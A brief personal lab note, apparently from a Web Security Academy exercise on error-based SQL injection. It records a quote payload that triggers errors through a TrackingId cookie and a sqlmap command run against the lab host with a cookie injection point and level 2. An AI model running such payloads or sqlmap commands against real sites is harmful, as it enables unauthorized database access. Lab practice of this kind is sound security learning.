#sqli/error 

Trigger Cookie errors `' and '' ` 

can i sqlmap this? yea
```
sqlmap -u "https://0ae90096037b9bcfd41125bb007a00b4.web-security-academy.net/" --cookie="TrackingId=1" --batch --level=2
```

> does not find when level not specified, maybe thats how cookie works